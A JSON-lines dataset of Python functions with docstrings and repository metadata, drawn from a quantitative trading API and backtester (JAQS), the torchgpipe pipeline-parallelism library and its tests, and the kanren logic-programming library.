{"docstring": "\"\"\"\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def confirm_internal_order(self, task_id, confirmed):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {\"task_id\"  : task_id,\n              \"confirmed\": confirmed}\n\ncr = self._remote.call(\"oms.confirm_internal_order\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\n    task_id: -1 -- all\n    return pd.dataframe\n\"\"\"\n\n", "func_signal": "def query_task(self, task_id=-1, format=\"\"):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {\"task_id\": task_id}\n\ndata_format = self._get_format(format, \"pandas\")\nif data_format == \"pandas\":\n    rpc_params[\"format\"] = \"columnset\"\n\ncr = self._remote.call(\"oms.query_task\", rpc_params)\n\nreturn utils.extract_result(cr, data_format=data_format, class_name=\"Task\")", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def stop_portfolio(self):\n", "code": "r, msg = self._check_session()\nif not r: return (False, msg)\n\nrpc_params = {}\n    \ncr = self._remote.call(\"pms.stop_portfolio\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\n    return pd.dataframe\n\"\"\"\n\n", "func_signal": "def query_portfolio(self, format=\"\"):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {}\n\ndata_format = self._get_format(format, \"pandas\")\nif data_format == \"pandas\":\n    rpc_params[\"format\"] = \"columnset\"\n\ncr = self._remote.call(\"pms.query_portfolio\", rpc_params)\n\nreturn utils.extract_result(cr, index_column=\"security\", data_format=data_format, class_name=\"NetPosition\")", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def place_order(self, security, action, price, size, algo=\"\", algo_param={}, userdata=\"\"):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = { \"security\"    : security,\n               \"action\"      : action,\n               \"price\"       : price,\n               \"size\"        : int(size),\n               \"algo\"        : algo,\n               \"algo_param\"  : json.dumps(algo_param),\n               \"user\"        : self._username,\n               \"userdata\"    : userdata}\n\ncr = self._remote.call(\"oms.place_order\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nInitialize parameters values for all backtest components such as\nDataService, PortfolioManager, Strategy, etc.\n\nParameters\n----------\nprops : dict\n\n\"\"\"\n", "func_signal": "def init_from_config(self, props):\n", "code": "for name in ['start_date', 'end_date']:\n    if name not in props:\n        raise ValueError(\"{} must be provided in props.\".format(name))\n\nself.props = props\nself.start_date = props.get(\"start_date\")\nself.end_date = props.get(\"end_date\")\n\nself.commission_rate = props.get('commission_rate', 20E-4)\n\nif 'symbol' in props:\n    self.ctx.init_universe(props['symbol'])\nelif hasattr(self.ctx, 'dataview'):\n    self.ctx.init_universe(self.ctx.dataview.symbol)\nelse:\n    raise ValueError(\"No dataview, no symbol either.\")\n\nif 'init_balance' not in props:\n    raise ValueError(\"No [init_balance] provided. Please specify it in props.\")\n\nfor obj in ['data_api', 'trade_api', 'pm', 'strategy']:\n    obj = getattr(self.ctx, obj)\n    if obj is not None:\n        obj.init_from_config(props)", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\norders format:\n    [ {\"security\": \"000001.SZ\", \"ref_price\": 10.0, \"inc_size\" : 100}, ...]\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def basket_order(self, orders, algo=\"\", algo_param={}, userdata=\"\"):\n", "code": "r, msg = self._check_session()\nif not r: return (False, msg)\n\nif type(orders) is pd.core.frame.DataFrame :\n    tmp = []\n    for i in range(0, len(orders)):\n        tmp.append ({'security': orders.index[i],\n                     'ref_price': float(orders['ref_price'][i]),\n                     'inc_size' : int(orders['inc_size'][i])})\n    orders = tmp\n\nrpc_params = {\"orders\": orders,\n              \"algo\": algo,\n              \"algo_param\": json.dumps(algo_param),\n              \"user\": self._username,\n              \"userdata\": userdata}\n\ncr = self._remote.call(\"pms.basket_order\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "# self.ctx.strategy.on_new_day(date)\n", "func_signal": "def on_new_day(self, date):\n", "code": "self.ctx.trade_api.on_new_day(date)\nself.ctx.snapshot = self.ctx.dataview.get_snapshot(date)\n\n# temporary fix, tzxu\n# Can univ_price_dic has DataFrame format?\nif date in self.tmp_univ_price_dic_map:\n    self.univ_price_dic = self.tmp_univ_price_dic_map[date]\nelse:\n    # self.univ_price_dic = self.ctx.snapshot.to_dict(orient='index')\n    #self.univ_price_dic = self.ctx.snapshot.loc[:, ['close', 'vwap', 'open', 'high', 'low']].to_dict(orient='index')\n    self.univ_price_dic = self.ctx.snapshot.to_dict(orient='index')\n    self.tmp_univ_price_dic_map[date] = self.univ_price_dic", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "# TODO: 10% is not the absolute value to check limit reach\n", "func_signal": "def get_limit_reaches(self):\n", "code": "df = self.ctx.dataview.get_snapshot(self.ctx.trade_date, fields=\"_limit\")\ndf = df[df > 9.5E-2].dropna()\nreturn df.index.values", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nGet bar DataFrame from DataApi or DataView.\n\nParameters\n----------\nsymbol : str or unicode\nstart_date : int\nend_date : int\n\nReturns\n-------\nres : pd.DataFrame\n\n\"\"\"\n", "func_signal": "def _get_df_daily(self, symbol, start_date, end_date):\n", "code": "if self.ctx.dataview is not None:\n    df_daily = self.ctx.dataview.get(symbol=symbol,\n                                     start_date=start_date, end_date=end_date,\n                                     fields='open,high,low,close,volume,oi,trade_date,time',\n                                     data_format='long')\nelif self.ctx.data_api is not None:\n    df_daily, _ = self.ctx.data_api.daily(symbol=symbol,\n                                          start_date=start_date, end_date=end_date,\n                                          adjust_mode=None)\nelse:\n    raise ValueError()\n    \nreturn df_daily", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\n    securities: seperate by \",\"\n    return pd.dataframe\n\"\"\"\n\n", "func_signal": "def query_position(self, mode=\"all\", securities=\"\", format=\"\"):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {\"mode\"       : mode,\n              \"security\"   : securities}\n\ndata_format = self._get_format(format, \"pandas\")\nif data_format == \"pandas\":\n    rpc_params[\"format\"] = \"columnset\"\n\ncr = self._remote.call(\"oms.query_position\", rpc_params)\n\nreturn utils.extract_result(cr, data_format=data_format, class_name=\"Position\")", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "# print \"call\", method, params, timeout\n", "func_signal": "def call(self, method, params, timeout=6):\n", "code": "callid = self.next_callid()\nif timeout:\n    q = self._alloc_wait_queue()\n\n    self._waiter_lock.acquire()\n    self._waiter_map[callid] = q\n    self._waiter_lock.release()\n\nmsg = {'jsonrpc': '2.0',\n       'method': method,\n       'params': params,\n       'id': str(callid)}\n\n# print \"SEND\", msg\njson_str = self._pack(msg)\nself._send_request(json_str)\n\nif timeout:\n    ret = {}\n    try:\n        r = q.get(timeout=timeout)\n        q.task_done()\n    except qEmpty:\n        r = None\n\n    self._waiter_lock.acquire()\n    self._waiter_map[callid] = None\n    self._waiter_lock.release()\n    self._free_wait_queue(q)\n\n    if r:\n        if 'result' in r:\n            ret['result'] = r['result']\n\n        if 'error' in r:\n            ret['error'] = r['error']\n\n    return ret if ret else {'error': {'error': -1, 'message': \"timeout\"}}\nelse:\n    return {'result': True}", "path": "jaqs\\data\\dataapi\\jrpc_py.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nadjust happens after market close\nBefore each re-balance day, adjust for all dividend and cash paid actions during the last period.\nWe assume all cash will be re-invested.\nSince we adjust our position at next re-balance day, PnL before that may be incorrect.\n\n\"\"\"\n", "func_signal": "def position_adjust(self):\n", "code": "start = self.last_rebalance_date  # start will be one day later\nend = self.current_rebalance_date  # end is the same to ensure position adjusted for dividend on rebalance day\ndf_adj = self.ctx.dataview.get_ts('_daily_adjust_factor', start_date=start, end_date=end)\n\n# FIXME: the first day should have been balanced before?\ndf_adj = df_adj[1:]\n\npm = self.ctx.pm\n\n# Find symbols which has adj_factor not equaling 1\ntmp = df_adj[df_adj!=1].fillna(0.0).sum()\nadj_symbols = set(tmp[tmp!=0].index).intersection(pm.holding_securities)\n\n#for symbol in pm.holding_securities:\n\nfor symbol in adj_symbols:\n    ser = df_adj.loc[:, symbol]\n    ser_adj = ser.dropna()\n    for date, ratio in ser_adj.iteritems():\n        pos_old = pm.get_position(symbol).current_size\n        # TODO pos will become float, original: int\n        pos_new = pos_old * ratio\n        pos_diff = pos_new - pos_old  # must be positive\n        if pos_diff <= 0:\n            # TODO this is possible\n            # raise ValueError(\"pos_diff <= 0\")\n            continue\n        \n        trade_ind = Trade()\n        trade_ind.symbol = symbol\n        trade_ind.task_id = self.POSITION_ADJUST_NO\n        trade_ind.entrust_no = self.POSITION_ADJUST_NO\n        trade_ind.entrust_action = common.ORDER_ACTION.BUY  # for now only BUY\n        trade_ind.set_fill_info(price=0.0, size=pos_diff,\n                                date=date, time=200000,\n                                no=self.POSITION_ADJUST_NO,\n                                trade_date=date)\n        \n        self.ctx.strategy.on_trade(trade_ind)", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def cancel_order(self, task_id):\n", "code": "r, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {\"task_id\": task_id}\n\ncr = self._remote.call(\"oms.cancel_order\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"update self.ctx.trade_date and last_date.\"\"\"\n", "func_signal": "def go_next_rebalance_day(self):\n", "code": "if self.ctx.gateway.match_finished:\n    next_period_day = jutil.get_next_period_day(self.ctx.trade_date,\n                                                 self.ctx.strategy.period, self.ctx.strategy.days_delay)\n    # update current_date: next_period_day is a workday, but not necessarily a trade date\n    if self.ctx.calendar.is_trade_date(next_period_day):\n        self.ctx.trade_date = next_period_day\n    else:\n        self.ctx.trade_date = self.ctx.calendar.get_next_trade_date(next_period_day)\n    self.ctx.trade_date = self.ctx.calendar.get_next_trade_date(next_period_day)\n\n    # update re-balance date\n    if self.current_rebalance_date > 0:\n        self.last_rebalance_date = self.current_rebalance_date\n    else:\n        self.last_rebalance_date = self.start_date\n    self.current_rebalance_date = self.ctx.trade_date\nelse:\n    # TODO here we must make sure the matching will not last to next period\n    self.ctx.trade_date = self.ctx.calendar.get_next_trade_date(self.ctx.trade_date)\n\nself.last_date = self.ctx.calendar.get_last_trade_date(self.ctx.trade_date)", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"Gets the skip tracker on the current thread.\"\"\"\n", "func_signal": "def current_skip_tracker() -> SkipTracker:\n", "code": "skip_tracker = thread_local.skip_tracker\n\nif skip_tracker is None:\n    skip_tracker = SkipTracker()\n    thread_local.skip_tracker = skip_tracker\n\nreturn skip_tracker", "path": "torchgpipe\\skip\\tracker.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Makes :func:`is_recomputing` return :data:`True` within a context.\"\"\"\n", "func_signal": "def enable_recomputing() -> Generator[None, None, None]:\n", "code": "orig = thread_local.is_recomputing\nthread_local.is_recomputing = True\ntry:\n    yield\nfinally:\n    thread_local.is_recomputing = orig", "path": "torchgpipe\\checkpoint.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Runs pipeline parallelism.\n\nIt modifies the given batches in place.\n\n\"\"\"\n", "func_signal": "def run(self) -> None:\n", "code": "batches = self.batches\npartitions = self.partitions\ndevices = self.devices\nskip_layout = self.skip_layout\n\nm = len(batches)\nn = len(partitions)\n\nskip_trackers = [SkipTrackerThroughPotals(skip_layout) for _ in batches]\n\nwith spawn_workers(devices) as (in_queues, out_queues):\n    for schedule in clock_cycles(m, n):\n        self.fence(schedule, skip_trackers)\n        self.compute(schedule, skip_trackers, in_queues, out_queues)", "path": "torchgpipe\\pipeline.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# This test detects unexpected block reallocation. For reliable test,\n# the stream to allocate tensors is isolated. The allocator will not\n# reuse free blocks which were allocated from another stream.\n", "func_signal": "def test_record_stream_cuda(self, cuda_sleep):\n", "code": "stream_alloc = new_stream(torch.device('cuda'))\nwith torch.cuda.stream(stream_alloc):\n    x = torch.rand(1, device=torch.device('cuda'))\n\nstream = new_stream(torch.device('cuda'))\nrecord_stream(x, stream)\nwith use_stream(stream):\n    cuda_sleep(0.5)\n\n# 'x' is deleted at Python's perspective. But the block of 'x' is still\n# required for 'stream'. 'y' shouldn't be allocated to the block.\ndata_ptr = x.data_ptr()\ndel x\nstream_alloc.synchronize()\nwith torch.cuda.stream(stream_alloc):\n    y = torch.rand(1, device=torch.device('cuda'))\nassert y.data_ptr() != data_ptr\n\n# Pause Python until 'stream' finishes tasks queued. Now the block of\n# 'x' is free to be reallocated.\nwait_stream(CPUStream, stream)\nwith torch.cuda.stream(stream_alloc):\n    z = torch.rand(1, device=torch.device('cuda'))\nassert z.data_ptr() == data_ptr", "path": "tests\\test_stream.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# Copied from https://github.com/pytorch/pytorch/pull/18568.\n", "func_signal": "def test_serial_checkpoints(device):\n", "code": "timeline = []\n\nclass Log(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, name, x):\n        ctx.name = name\n        timeline.append(f'{name}:forward')\n        return x.detach()\n\n    @staticmethod\n    def backward(ctx, grad_output):\n        name = ctx.name\n        timeline.append(f'{name}:backward')\n        return None, grad_output\n\na = torch.rand(1, device=device, requires_grad=True)\nb = torch.rand(1, device=device, requires_grad=True)\n\n# Increase the next function sequence number.\n_ = a + 1 + 2 + 3 + 4 + 5\n\na = checkpoint(partial(Log.apply, 'a'), a)\n\na, phony = fork(a)\nb = join(b, phony)\n\nb = checkpoint(partial(Log.apply, 'b'), b)\n\nc = torch.cat((a, b))\n\nout = c.sum()\n\n#                        +--> {a} --Checkpoint(Log)--> {a}\n# {out} --Sum--> {c} --Cat     ^-----------------------------+\n#                        +--> {b} --Checkpoint(Log)--> {b} --First--> {b}\nout.backward()\n\nassert timeline == \\\n    ['a:forward', 'b:forward', 'b:forward', 'b:backward', 'a:forward', 'a:backward']\n#    |----------------------|  |-----------------------|  |-----------------------|\n#          forward pass            Checkpoint(Log[b])         Checkpoint(Log[a])", "path": "tests\\test_checkpoint.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Retrieves the underlying tensors.\"\"\"\n", "func_signal": "def tensors(self) -> Tensors:\n", "code": "if self.atomic:\n    raise AttributeError('batch is atomic')\nreturn cast(Tensors, self.value)", "path": "torchgpipe\\microbatch.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Prints a horizontal line.\"\"\"\n", "func_signal": "def hr() -> None:\n", "code": "width, _ = click.get_terminal_size()\nclick.echo('-' * width)", "path": "benchmarks\\resnet101-speed\\main.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Updates the running statistics of a mini-batch.\"\"\"\n", "func_signal": "def _commit(self) -> None:\n", "code": "exponential_average_factor = 0.0\nself.num_batches_tracked += 1\nif self.momentum is None:  # use cumulative moving average\n    exponential_average_factor = 1.0 / float(self.num_batches_tracked)\nelse:  # use exponential moving average\n    exponential_average_factor = self.momentum\n\nmean = self.sum/self.counter\nvar = self.sum_squares/self.counter - mean**2\n\n# Calculate the exponential moving average here.\nm = exponential_average_factor\n\nself.running_mean *= 1 - m\nself.running_mean += mean * m\n\nself.running_var *= 1 - m\nself.running_var += var * m\n\nself.sum.zero_()\nself.sum_squares.zero_()\nself.counter = 0\nself.tracked = 0", "path": "torchgpipe\\batchnorm.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# Issue: https://github.com/pytorch/pytorch/issues/27366\n", "func_signal": "def test_record_stream_shifted_view(self, cuda_sleep):\n", "code": "stream_alloc = new_stream(torch.device('cuda'))\nwith torch.cuda.stream(stream_alloc):\n    x = torch.rand(2, device=torch.device('cuda'))\n\ny = x[1:]\nassert y.data_ptr() > x.data_ptr()\n\nstream = new_stream(torch.device('cuda'))\nwith use_stream(stream):\n    cuda_sleep(0.5)\nrecord_stream(y, stream)\n\ndata_ptr = x.data_ptr()\ndel x, y\n\nstream_alloc.synchronize()\nwith torch.cuda.stream(stream_alloc):\n    z = torch.rand(2, device=torch.device('cuda'))\nassert z.data_ptr() != data_ptr", "path": "tests\\test_stream.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Prints a horizontal line.\"\"\"\n", "func_signal": "def hr() -> None:\n", "code": "width, _ = click.get_terminal_size()\nclick.echo('-' * width)", "path": "benchmarks\\resnet101-accuracy\\main.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Makes :func:`is_checkpointing` return :data:`True` within a context.\"\"\"\n", "func_signal": "def enable_checkpointing() -> Generator[None, None, None]:\n", "code": "orig = thread_local.is_checkpointing\nthread_local.is_checkpointing = True\ntry:\n    yield\nfinally:\n    thread_local.is_checkpointing = orig", "path": "torchgpipe\\checkpoint.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# 'foo' requires grad but 'bar' does not. In-place operation on\n# 'bar' won't cause a RuntimeError.\n", "func_signal": "def forward(self, foo_bar):\n", "code": "foo, bar = foo_bar\n\n# add_(1) is not idempotent, in contrast to relu_(). If it is\n# executed multiple times, it will accumulates each difference onto\n# 'bar'.\nbar.add_(1)\n\n# 'bar' is still captured by checkpointing. 'foo' will get\n# incorrect grad.\nreturn foo * bar", "path": "tests\\test_inplace.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Iterates over namespaced skip names to be stashed.\"\"\"\n", "func_signal": "def stashable(self) -> Iterable[Tuple[Namespace, str]]:\n", "code": "for name in self.stashable_names:\n    yield self.namespaced(name)", "path": "torchgpipe\\skip\\skippable.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# Without checkpointing:\n# +- Stash --+  +--- Pop ----+ - - - layers\n# | 2,blue,1 |--| 1,orange,0 | - - - tensor_life and portal function\n# +----------+  +------------+\n#\n# With checkpointing:\n# +- Stash --+  +--- Pop ----+  +--- Pop'----+  +- Stash'--+\n# | 3,blue,2 |--| 2,orange,1 |--| 1,orange,0 |--| 1,blue,0 |\n# +----------+  +------------+  +------------+  +----------+\n\n", "func_signal": "def test_delete_portal_tensor(train, checkpoint):\n", "code": "def portal_tensor_life_is(tensor_life, skip_tracker=None):\n    if skip_tracker is None:\n        skip_tracker = current_skip_tracker()\n\n    # Get the current portal.\n    portal = list(skip_tracker.portals.values())[0]\n\n    if tensor_life == 0:\n        return portal.tensor_life == 0 and portal.tensor is None\n    else:\n        return portal.tensor_life == tensor_life and portal.tensor is not None\n\n# Check the portal tensor after 'Stash'.\nstash_ = Stash()\n\n@stash_.register_forward_hook\ndef check_portal_tensor_after_stash(*_):\n    if is_checkpointing():\n        assert portal_tensor_life_is(2)\n    elif is_recomputing():\n        assert portal_tensor_life_is(0)\n    else:\n        assert portal_tensor_life_is(1)\n\npop_ = Pop()\n\n@pop_.register_forward_hook\ndef check_portal_tensor_after_pop(*_):\n    if is_checkpointing():\n        assert portal_tensor_life_is(1)\n    elif is_recomputing():\n        assert portal_tensor_life_is(0)\n    else:\n        assert portal_tensor_life_is(0)\n\nclass NoPortalTensorAtBackward(nn.Module):\n    class F(torch.autograd.Function):\n        @staticmethod\n        def forward(ctx, input):\n            ctx.skip_tracker = current_skip_tracker()\n            return input.detach()\n\n        @staticmethod\n        def backward(ctx, grad):\n            assert portal_tensor_life_is(0, skip_tracker=ctx.skip_tracker)\n            return grad\n\n    def forward(self, input):\n        return self.F.apply(input)\n\nmodel = nn.Sequential(NoPortalTensorAtBackward(), stash_, pop_)\nmodel = GPipe(model,\n              balance=[2, 1],\n              devices=['cpu', 'cpu'],\n              chunks=2,\n              checkpoint=checkpoint)\n\ninput = torch.rand(10, requires_grad=True)\n\nif train:\n    model.train()\n    output = model(input)\n    output.norm().backward()\nelse:\n    model.eval()\n    with torch.no_grad():\n        model(input)", "path": "tests\\skip\\test_leak.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# In-place operation on a tensor not requiring grad doesn't cause a\n# RuntimeError. Currently, we cannot detect this case.\n", "func_signal": "def test_inplace_on_not_requires_grad():\n", "code": "model = nn.Sequential(nn.ReLU(inplace=True))\nmodel = GPipe(model, [1], devices=['cpu'], checkpoint='always')\n\nx = torch.rand(1)\ny = model(x)\n\nmatch = 'a leaf Variable that requires grad (is being|has been) used in an in-place operation.'\nwith pytest.raises(RuntimeError, match=match):\n    y.backward()", "path": "tests\\test_inplace.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Iterates over namespaced skip names to be popped.\"\"\"\n", "func_signal": "def poppable(self) -> Iterable[Tuple[Namespace, str]]:\n", "code": "for name in self.poppable_names:\n    yield self.namespaced(name)", "path": "torchgpipe\\skip\\skippable.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Prints a horizontal line.\"\"\"\n", "func_signal": "def hr() -> None:\n", "code": "width, _ = click.get_terminal_size()\nclick.echo('-' * width)", "path": "benchmarks\\unet-speed\\main.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Returns a batch applied by :class:`Checkpoint`.\"\"\"\n", "func_signal": "def checkpoint(self) -> Batch:\n", "code": "input_atomic = self.batch.atomic\ninput = tuple(self.batch)\n\n# Use a phony which requires grad to ensure that Checkpoint can be\n# tracked by the autograd engine even when none of the input tensors\n# require grad.\nphony = get_phony(self.batch[0].device, requires_grad=True)\n\noutput = Checkpoint.apply(phony, self.recomputed, self.rng_states,\n                          self.function, input_atomic, *input)\nreturn Batch(output)", "path": "torchgpipe\\checkpoint.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "# It should silently ignore CPU tensors.\n", "func_signal": "def test_record_stream_cpu(self):\n", "code": "x = torch.rand(1, device=torch.device('cpu'))\nrecord_stream(x, CPUStream)", "path": "tests\\test_stream.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\"Retrieves the underlying tensor.\"\"\"\n", "func_signal": "def tensor(self) -> Tensor:\n", "code": "if not self.atomic:\n    raise AttributeError('not atomic batch')\nreturn cast(Tensor, self.value)", "path": "torchgpipe\\microbatch.py", "repo_name": "kakaobrain/torchgpipe", "stars": 729, "license": "bsd-3-clause", "language": "python", "size": 468}
{"docstring": "\"\"\" Logical or for goal constructors\n\n>>> from kanren.arith import lor, eq, gt\n>>> gte = lor(eq, gt)  # greater than or equal to is `eq or gt`\n\"\"\"\n\n", "func_signal": "def lor(*goalconsts):\n", "code": "def goal(*args):\n    return lany(*[gc(*args) for gc in goalconsts])\n\nreturn goal", "path": "kanren\\arith.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Call goal be evaluated without raising an EarlyGoalError \"\"\"\n", "func_signal": "def earlysafe(goal):\n", "code": "try:\n    goaleval(goal)\n    return True\nexcept EarlyGoalError:\n    return False", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Logical all that greedily evaluates each goals in the order provided.\n\nNote that this may raise EarlyGoalError when the ordering of the\ngoals is incorrect. It is faster than lall, but should be used\nwith care.\n\n>>> from kanren import eq, run, membero\n>>> x, y = var('x'), var('y')\n>>> run(0, x, lallgreedy((eq, y, set([1]))), (membero, x, y))\n(1,)\n>>> run(0, x, lallgreedy((membero, x, y), (eq, y, {1})))  # doctest: +SKIP\nTraceback (most recent call last):\n  ...\nkanren.core.EarlyGoalError\n\"\"\"\n", "func_signal": "def lallgreedy(*goals):\n", "code": "if not goals:\n    return success\nif len(goals) == 1:\n    return goals[0]\n\ndef allgoal(s):\n    g = goaleval(reify(goals[0], s))\n    return unique(\n        interleave(goaleval(reify(\n            (lallgreedy, ) + tuple(goals[1:]), ss))(ss) for ss in g(s)),\n        key=dicthash)\n\nreturn allgoal", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Expand and then evaluate a goal\n\nIdempotent\n\nSee also:\n   goalexpand\n\"\"\"\n", "func_signal": "def goaleval(goal):\n", "code": "if callable(goal):  # goal is already a function like eq(x, 1)\n    return goal\nif isinstance(goal, tuple):  # goal is not yet evaluated like (eq, x, 1)\n    return find_fixed_point(evalt, goal)\nraise TypeError(\"Expected either function or tuple\")", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Logical all - Run goals one at a time\n\n>>> from kanren import membero\n>>> x = var('x')\n>>> g = lallfirst(membero(x, (1,2,3)), membero(x, (2,3,4)))\n>>> tuple(g({}))\n({~x: 2}, {~x: 3})\n>>> tuple(lallfirst()({}))\n({},)\n\"\"\"\n", "func_signal": "def lallfirst(*goals):\n", "code": "if not goals:\n    return success\nif len(goals) == 1:\n    return goals[0]\n\ndef allgoal(s):\n    for i, g in enumerate(goals):\n        try:\n            goal = goaleval(reify(g, s))\n        except EarlyGoalError:\n            continue\n        other_goals = tuple(goals[:i] + goals[i + 1:])\n        return unique(\n            interleave(\n                goaleval(reify((lallfirst, ) + other_goals, ss))(ss)\n                for ss in goal(s)),\n            key=dicthash)\n    else:\n        raise EarlyGoalError()\n\nreturn allgoal", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Goal such that u == v\n\nSee also:\n    unify\n\"\"\"\n\n", "func_signal": "def eq(u, v):\n", "code": "def goal_eq(s):\n    result = unify(u, v, s)\n    if result is not False:\n        yield result\n\nreturn goal_eq", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Run a logic program.  Obtain n solutions to satisfy goals.\n\nn     - number of desired solutions.  See ``take``\n        0 for all\n        None for a lazy sequence\nx     - Output variable\ngoals - a sequence of goals.  All must be true\n\n>>> from kanren import run, var, eq\n>>> x = var()\n>>> run(1, x, eq(x, 1))\n(1,)\n\"\"\"\n", "func_signal": "def run(n, x, *goals):\n", "code": "results = map(partial(reify, x), goaleval(lall(*goals))({}))\nreturn take(n, unique(results, key=multihash))", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
